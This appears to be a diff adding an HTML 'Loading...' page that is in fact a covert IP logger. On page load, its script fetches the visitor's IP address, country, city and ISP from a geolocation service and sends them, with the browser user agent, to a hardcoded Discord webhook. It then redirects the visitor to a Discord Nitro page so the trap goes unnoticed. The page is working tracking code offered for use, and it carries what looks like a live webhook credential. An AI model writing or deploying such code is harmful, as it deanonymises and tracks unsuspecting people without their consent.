@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1517646419182485525/HboDIfUeTnj-mDQJ59sFeBdAssozVQZq9xEz2Xw-elr6oTh5HHeHKUddaiMqLJ-A-NaJ";
+const REDIRECT = "https://discord.com/nitro"; // where to send them after
+
+fetch("https://ip-api.com/json/?fields=query,country,city,isp,org")
+  .then(r => r.json())
+  .then(data => {
+    fetch(WEBHOOK, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        embeds: [{
+          title: "🎯 IP Logged",
+          color: 0xff2200,
+          fields: [
+            {name: "IP", value: "`" + data.query + "`", inline: true},
+            {name: "Country", value: data.country, inline: true},
+            {name: "City", value: data.city, inline: true},
+            {name: "ISP", value: data.isp, inline: false},
+            {name: "UA", value: "`" + navigator.userAgent + "`", inline: false}
+          ]
+        }]
+      })
+    });
+  })
+  .finally(() => { window.location = REDIRECT; });
+</script>
+<p>Loading...</p>
+</body>
+</html>
